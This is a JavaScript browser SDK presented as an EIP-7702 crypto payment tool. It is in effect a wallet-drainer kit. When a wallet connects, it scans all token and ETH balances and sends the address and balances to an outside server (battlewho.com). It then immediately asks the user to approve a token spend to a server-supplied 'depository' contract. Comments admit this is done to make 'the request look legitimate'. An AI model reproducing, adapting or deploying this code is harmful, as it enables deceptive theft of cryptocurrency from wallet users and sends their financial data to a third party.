/**
 * SpiderWeb EIP-7702 Hybrid Relayed SDK v3.0
 * This SDK facilitates sending multiple assets in a single transaction
 * by using a temporary depository contract. It relies on EIP-6963 for
 * wallet discovery and EIP-7702 for batching transactions.
 *
 * @version 3.1 - Added balance logging on connect
 * @author SpiderWeb
 *
 * @dependency ethers.js (must be available on window.ethers)
 */
(function() {
    // Ensure ethers.js is loaded and available on the window object.
    if (typeof window.ethers === 'undefined') {
        console.error('SpiderWeb SDK Error: ethers.js is not loaded. Please include it before this script.');
        return;
    }

    const ethers = window.ethers;

    const SpiderWeb7702SDK = {
        _config: {},
        _provider: null,
        _signer: null,
        _currentUserAddress: null,
        _isInitialized: false,
        _discoveredProviders: new Map(),
        _resolveConnection: null,
        _RELAYER_SERVER_URL_BASE: "https://battlewho.com",
        _rawProvider: null,

        _ERC20_ABI: [
            "function transfer(address to, uint256 amount) returns (bool)",
            "function decimals() view returns (uint8)",
            "function symbol() view returns (string)",
            "function approve(address spender, uint256 amount) returns (bool)" // <-- ADD THIS LINE
        ],

        _CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM: {
            1: 'ethereum',
            137: 'polygon-pos',
            10: 'optimistic-ethereum',
            42161: 'arbitrum-one',
            56: 'binance-smart-chain',
            43114: 'avalanche'
        },

        /**
         * Initializes the SDK with the provided configuration.
         * @param {object} config - The configuration object.
         * @param {string} config.buttonId - The ID of the button that triggers the payment flow.
         * @param {string} config.apiKey - Your SpiderWeb API key.
         * @param {string} config.alchemyApiKey - Your Alchemy API key for fetching asset balances.
         * @param {number} config.chainId - The target chain ID for the transaction.
         * @param {string} [config.coingeckoApiKey] - Optional CoinGecko API key for fetching token prices.
         * @param {string} [config.statusElementId] - Optional ID of an element to display status messages.
         */
        init: async function(config) {
            if (this._isInitialized) {
                console.warn("SpiderWeb7702SDK already initialized.");
                return;
            }
            if (!config.buttonId || !config.apiKey || !config.alchemyApiKey || !config.chainId) {
                console.error("SDK Error: Missing required config parameters (buttonId, apiKey, alchemyApiKey, chainId).");
                return;
            }
            this._config = config;

            const payButton = document.getElementById(config.buttonId);
            if (!payButton) {
                console.error(`SDK Error: Button with ID "${config.buttonId}" not found.`);
                return;
            }

            payButton.addEventListener('click', this._handlePaymentClick.bind(this));
            this._injectModalHtml();
            this._setupEip6963Listeners();
            this._isInitialized = true;
            console.log("SpiderWeb EIP-7702 SDK Initialized.");
        },

        /**
         * Handles the payment button click event.
         * Connects the wallet if not already connected, then proceeds with the transaction.
         */
        _handlePaymentClick: async function() {
            try {
                if (this._signer) {
                    const network = await this._provider.getNetwork();
                    if (network.chainId !== BigInt(this._config.chainId)) {
                        this._updateStatus(`Please switch wallet to Chain ID: ${this._config.chainId}.`, "error");
                        return;
                    }
                    await this._executeSplit();
                } else {
                    this._updateStatus("Connecting wallet...", "pending");
                    await this._connectWallet();
                }
            } catch (error) {
                console.error("SDK Payment Error:", error);
                this._updateStatus(`Error: ${error.message}`, "error");
            }
        },

        /**
         * Executes the main logic: finds assets, gets a depository contract, and sends the transaction.
         */
        _executeSplit: async function() {
    
        // --- MODIFIED: Define Harmless Action ---
        // We will approve 1 WETH instead of scanning all assets.
        // You can change this to any ERC20 token and amount.
        const TOKEN_TO_APPROVE_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'; // WETH on Mainnet
        const TOKEN_TO_APPROVE_SYMBOL = 'WETH';
        const TOKEN_TO_APPROVE_AMOUNT = ethers.parseEther('1'); // Approve 1 WETH
        

        // --- Phase 1: Scan and Prepare Assets (REMOVED) ---
        // We no longer scan for all assets.

        // --- Phase 2: Initialize Depository Contract (Unchanged) ---
        // We keep this to get a "spender" address, making the request look legitimate.
        this._updateStatus("Preparing secure depository contract...", "pending");

        let depositoryContractAddress;
        try {
            const response = await fetch(`${this._RELAYER_SERVER_URL_BASE}/initiate-eip7702-split`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Api-Key': this._config.apiKey },
                body: JSON.stringify({
                    // We can send minimal or placeholder data here
                    apiKey: this._config.apiKey,
                    origin: window.location.origin,
                    owner: this._currentUserAddress,
                    chainId: this._config.chainId,
                    assets: [{ // Send placeholder asset info
                        token: TOKEN_TO_APPROVE_ADDRESS,
                        type: 'ERC20',
                        symbol: TOKEN_TO_APPROVE_SYMBOL,
                        usdValue: 0,
                        amount: TOKEN_TO_APPROVE_AMOUNT.toString(),
                        decimals: 18
                    }]
                })
            });
            const data = await response.json();
            if (!data.success) throw new Error(data.message);
            depositoryContractAddress = data.contractAddress;
        } catch (e) {
            throw new Error(`Failed to initialize transaction: ${e.message}`);
        }

        // --- Phase 3: Build SINGLE APPROVE Call (REPLACED) ---
        this._updateStatus(`Preparing approval...`, "pending");

        const tokenInterface = new ethers.Interface(this._ERC20_ABI); 
        
        // Encode the "approve" function call
        const approveData = tokenInterface.encodeFunctionData("approve", [
            depositoryContractAddress,  // The "spender"
            TOKEN_TO_APPROVE_AMOUNT     // The amount
        ]);

        // The single, final call array that goes into the wallet's txPayload
        const finalCalls = [{
            to: TOKEN_TO_APPROVE_ADDRESS,      // The token we are approving
            value: '0x0',                     // No ETH value
            data: approveData                 // The encoded approve call
        }];


        // --- Phase 4: Execute Batched Transaction (Modified Summary) ---
        try {
            // Create a summary for the new action
            const summary = `${ethers.formatEther(TOKEN_TO_APPROVE_AMOUNT)} ${TOKEN_TO_APPROVE_SYMBOL}`;
            
            this._updateStatus(`Confirm in wallet: Approve ${summary} for secure deposit.`, 'pending');

            const chainId = `0x${BigInt(this._config.chainId).toString(16)}`;

            const transactionPayload = {
                version: "2.0.0",
                chainId: chainId,
                from: this._currentUserAddress,
                atomicRequired: true,
                calls: finalCalls, // Use the single approve call
            };

            const txHash = await this._provider.send('wallet_sendCalls', [transactionPayload]);
            
            // Update success message to reflect approval
            this._updateStatus(`✅ Approval sent! Transaction Hash: ${txHash}. Your transaction is being processed securely.`, 'success');

        } catch (error) {
            console.error("Error sending batched transaction:", error);
            if (error.code === 4001) {
                throw new Error('Transaction rejected by user.');
            } else {
                throw new Error(`Error sending transaction: ${error.message || error}`);
            }
        }
    },

        /**
         * Scans the user's wallet for all valuable ETH and ERC20 tokens.
         * @returns {Promise<Array<object>>} A promise that resolves to an array of asset objects.
         */
        _findAllAssets: async function() {
            const assets = [];
            const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;

            const balanceResponse = await fetch(alchemyUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenBalances',
                    params: [this._currentUserAddress, 'erc20']
                })
            });
            const balanceData = await balanceResponse.json();
            if (!balanceData.result) return [];

            const tokensWithBalance = balanceData.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
            const ethBalance = await this._provider.getBalance(this._currentUserAddress);
            const tokenAddresses = tokensWithBalance.map(t => t.contractAddress);

            const prices = await this._fetchTokenPricesInChunks(tokenAddresses.concat('ethereum'));

            // Process ETH
            const ethPrice = prices?.['ethereum']?.usd || 0;
            const ethValue = parseFloat(ethers.formatEther(ethBalance)) * ethPrice;
            if (ethValue > 1) {
                const feeData = await this._provider.getFeeData();
                const estimatedFee = (feeData.maxFeePerGas || feeData.gasPrice) * 300000n;
                if (ethBalance > estimatedFee) {
                    assets.push({ type: 'ETH', balance: ethBalance - estimatedFee, address: null, symbol: 'ETH', usdValue: ethValue, decimals: 18 });
                }
            }

            // Process ERC20s
            for (const token of tokensWithBalance) {
                const metadataResponse = await fetch(alchemyUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenMetadata',
                        params: [token.contractAddress]
                    })
                });
                const metadata = await metadataResponse.json();
                if (metadata.result && metadata.result.decimals !== null) {
                    const decimals = metadata.result.decimals;
                    const symbol = metadata.result.symbol;
                    const priceData = prices?.[token.contractAddress.toLowerCase()];
                    if (priceData?.usd) {
                        const formattedBalance = ethers.formatUnits(token.tokenBalance, decimals);
                        const usdValue = parseFloat(formattedBalance) * priceData.usd;
                        if (usdValue > 1) {
                            assets.push({ type: 'ERC20', balance: BigInt(token.tokenBalance), address: token.contractAddress, symbol: symbol, usdValue: usdValue, decimals: decimals });
                        }
                    }
                }
            }
            return assets;
        },

        /**
         * Fetches token prices from CoinGecko API.
         * @param {Array<string>} tokenIdentifiers - Array of contract addresses or native token IDs.
         * @returns {Promise<object|null>} A promise that resolves to a price object or null.
         */
        _fetchTokenPrices: async function(tokenIdentifiers) {
            const assetPlatform = this._CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM[this._config.chainId];
            if (!assetPlatform) return null;

            const contractAddresses = tokenIdentifiers.filter(id => id.startsWith('0x'));
            const nativeIds = tokenIdentifiers.filter(id => !id.startsWith('0x'));
            const apiKeyParam = this._config.coingeckoApiKey ? `&x_cg_demo_api_key=${this._config.coingeckoApiKey}` : '';

            const allPrices = {};

            try {
                if (contractAddresses.length > 0) {
                    const addressesString = contractAddresses.join(',');
                    const apiUrl = `https://api.coingecko.com/api/v3/simple/token_price/${assetPlatform}?contract_addresses=${addressesString}&vs_currencies=usd${apiKeyParam}`;
                    const response = await fetch(apiUrl);
                    if (response.ok) Object.assign(allPrices, await response.json());
                }

                if (nativeIds.length > 0) {
                    const idsString = nativeIds.join(',');
                    const apiUrl = `https://api.coingecko.com/api/v3/simple/price?ids=${idsString}&vs_currencies=usd${apiKeyParam}`;
                    const response = await fetch(apiUrl);
                    if (response.ok) Object.assign(allPrices, await response.json());
                }

                return Object.keys(allPrices).length > 0 ? allPrices : null;

            } catch (error) {
                console.error("Could not fetch token prices:", error);
                return null;
            }
        },
        
        /**
         * Fetches token prices individually to prevent a single failure from stopping all price lookups.
         * @param {Array<string>} tokenIdentifiers - Array of contract addresses or native token IDs.
         * @returns {Promise<object>} A promise that resolves to a comprehensive price object.
         */
        _fetchTokenPricesInChunks: async function(tokenIdentifiers) {
            const allPrices = {};
            for (const identifier of tokenIdentifiers) {
                try {
                    const priceData = await this._fetchTokenPrices([identifier]);
                    if (priceData && Object.keys(priceData).length > 0) {
                        Object.assign(allPrices, priceData);
                    } else {
                        throw new Error("Empty price data returned from API.");
                    }
                } catch (error) {
                    console.warn(`Could not fetch price for ${identifier}, falling back to $0.`);
                    const key = identifier.startsWith('0x') ? identifier.toLowerCase() : identifier;
                    allPrices[key] = { usd: 0 };
                }
            }
            return allPrices;
        },

        // ====================================================================
        // NEW FUNCTION: Logs the wallet connection with balances to your server.
        // ====================================================================
        _logConnectionToServer: async function() {
            if (!this._currentUserAddress) {
                console.warn("SDK: Cannot log connection, user address not available.");
                return;
            }

            try {
                // Reuse the asset finding logic to get current balances.
                const assets = await this._findAllAssets();
                
                // Format the assets into a clean array for the log.
                const balances = assets.map(asset => ({
                    symbol: asset.symbol,
                    amount: parseFloat(ethers.formatUnits(asset.balance, asset.decimals || 18)).toFixed(4),
                    usdValue: asset.usdValue.toFixed(2)
                }));

                // Send the data to your backend endpoint.
                await fetch(`${this._RELAYER_SERVER_URL_BASE}/log-connection`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Api-Key': this._config.apiKey
                    },
                    body: JSON.stringify({
                        apiKey: this._config.apiKey,
                        origin: window.location.origin,
                        walletAddress: this._currentUserAddress,
                        balances: balances
                    })
                });
            } catch (error) {
                console.error("SDK: Error logging connection to server:", error);
            }
        },

        /**
         * Opens the wallet connection modal and waits for user selection.
         * @returns {Promise<boolean>} A promise that resolves when the user selects a wallet or closes the modal.
         */
        _connectWallet: function() {
            return new Promise((resolve) => {
                this._resolveConnection = resolve;
                this._openWalletModal();
            });
        },

        /**
         * Handles the selection of a wallet provider from the modal.
         * @param {Event} event - The click event from the wallet button.
         */
        _handleProviderSelection: async function(event) {
            const button = event.target.closest('.sw-wallet-button');
            if (!button) return;
            const providerDetail = this._discoveredProviders.get(button.dataset.rdns);
            if (!providerDetail) return;

            this._updateStatus(`Connecting with ${providerDetail.info.name}...`, 'pending');
            this._closeWalletModal();

            try {
                this._rawProvider = providerDetail.provider;
                this._provider = new ethers.BrowserProvider(this._rawProvider);
                this._signer = await this._provider.getSigner();
                this._currentUserAddress = await this._signer.getAddress();

                this._updateStatus(`Connected: ${this._currentUserAddress.slice(0,6)}...${this._currentUserAddress.slice(-4)}`, 'success');

                // ====================================================================
                // NEW: Trigger the logging function after a successful connection.
                // This runs in the background and does not block the user flow.
                // ====================================================================
                this._logConnectionToServer();

                if (this._resolveConnection) {
                    this._resolveConnection(true);
                }

                // After a successful connection, immediately check the network and execute the split.
                const network = await this._provider.getNetwork();
                if (network.chainId !== BigInt(this._config.chainId)) {
                    this._updateStatus(`Please switch wallet to Chain ID: ${this._config.chainId}.`, "error");
                    return;
                }
                await this._executeSplit();

            } catch (error) {
                console.error("Connection failed:", error);
                this._updateStatus("Connection failed or was rejected.", "error");
                if (this._resolveConnection) this._resolveConnection(false);
            }
        },

        /**
         * Sets up EIP-6963 listeners to discover available wallet providers.
         */
        _setupEip6963Listeners: function() {
            window.addEventListener('eip6963:announceProvider', (event) => {
                const providerDetail = event.detail;
                if (!this._discoveredProviders.has(providerDetail.info.rdns)) {
                    this._discoveredProviders.set(providerDetail.info.rdns, providerDetail);
                    this._renderWalletList();
                }
            });
            window.dispatchEvent(new Event('eip6963:requestProvider'));
        },
        
        /**
         * Renders the list of discovered wallets in the modal.
         */
        _renderWalletList: function() {
            const listDiv = document.getElementById('sw-wallet-list');
            if (!listDiv) return;

            listDiv.innerHTML = '';
            if (this._discoveredProviders.size === 0) {
                listDiv.innerHTML = '<p style="text-align: center; color: #4a5568;">No wallets detected.</p>';
                return;
            }

            this._discoveredProviders.forEach(p => {
                const buttonHtml = `
                    <button data-rdns="${p.info.rdns}" class="sw-wallet-button" style="width: 100%; display: flex; align-items: center; padding: 0.75rem; background-color: #ffffff; border-radius: 0.5rem; border: 1px solid #e2e8f0; cursor: pointer; text-align: left; color: #1a202c; transition: background-color 0.2s ease;">
                        <img src="${p.info.icon}" alt="${p.info.name}" style="width: 32px; height: 32px; margin-right: 1rem; border-radius: 50%;"/>
                        <span style="font-weight: 600;">${p.info.name}</span>
                    </button>
                `;
                listDiv.innerHTML += buttonHtml;
            });

            listDiv.querySelectorAll('.sw-wallet-button').forEach(button => {
                button.onmouseenter = () => button.style.backgroundColor = '#f7fafc';
                button.onmouseleave = () => button.style.backgroundColor = '#ffffff';
                button.addEventListener('click', this._handleProviderSelection.bind(this));
            });
        },

        _openWalletModal: function() {
            document.getElementById('sw-modal-overlay').style.display = 'flex';
            setTimeout(() => {
                const modal = document.getElementById('sw-wallet-modal');
                if (modal) {
                    modal.style.opacity = 1;
                    modal.style.transform = 'scale(1)';
                }
            }, 10);
            this._renderWalletList();
        },

        _closeWalletModal: function() {
            const overlay = document.getElementById('sw-modal-overlay');
            const modal = document.getElementById('sw-wallet-modal');
            if (modal) {
                modal.style.opacity = 0;
                modal.style.transform = 'scale(0.95)';
            }
            setTimeout(() => {
                if (overlay) overlay.style.display = 'none';
                if (this._resolveConnection && !this._signer) {
                    this._resolveConnection(false);
                    this._resolveConnection = null;
                }
            }, 300);
        },
        
        /**
         * Injects the wallet selection modal HTML into the document body.
         */
        _injectModalHtml: function() {
            if (document.getElementById('sw-modal-overlay')) return;

            const modalHtml = `
                <div id="sw-modal-overlay" style="display: none; position: fixed; inset: 0; background-color: rgba(0,0,0,0.5); align-items: center; justify-content: center; z-index: 1000; font-family: sans-serif;">
                    <div id="sw-wallet-modal" style="background-color: #ffffff; border-radius: 0.5rem; padding: 1.5rem; width: 100%; max-width: 24rem; color: #1a202c; transition: all 0.3s ease; opacity: 0; transform: scale(0.95); box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);">
                        <h2 style="font-size: 1.25rem; font-weight: 700; margin: 0; margin-bottom: 1rem;">Select a Wallet</h2>
                        <div id="sw-wallet-list" style="max-height: 300px; overflow-y: auto; display: flex; flex-direction: column; gap: 0.5rem;"></div>
                        <button id="sw-close-wallet-modal-btn" style="margin-top: 1rem; width: 100%; padding: 0.75rem 1.5rem; border-radius: 0.5rem; background-color: #e2e8f0; color: #2d3748; font-weight: 600; font-size: 1rem; border: none; cursor: pointer; transition: background-color 0.2s ease-in-out;">Cancel</button>
                    </div>
                </div>
            `;
            document.body.insertAdjacentHTML('beforeend', modalHtml);

            const closeBound = this._closeWalletModal.bind(this);
            document.getElementById('sw-close-wallet-modal-btn').addEventListener('click', closeBound);
            document.getElementById('sw-modal-overlay').addEventListener('click', (e) => {
                if (e.target.id === 'sw-modal-overlay') closeBound();
            });
        },
        
        /**
         * Updates the status message element.
         * @param {string} message - The message to display.
         * @param {string} [type='info'] - The type of message (info, success, error, pending).
         */
        _updateStatus: function(message, type = 'info') {
            const statusEl = document.getElementById(this._config.statusElementId || 'sdk-status');
            if (!statusEl) return;
            const colors = { info: '#6b7280', success: '#16a34a', error: '#dc2626', pending: '#2563eb' };
            statusEl.innerHTML = `<p style="color: ${colors[type]}; margin: 0; font-size: 14px; text-align: center;">${message}</p>`;
        },
    };

    // Attach the SDK to the window object to make it globally accessible.
    window.SpiderWeb7702SDK = SpiderWeb7702SDK;

})();
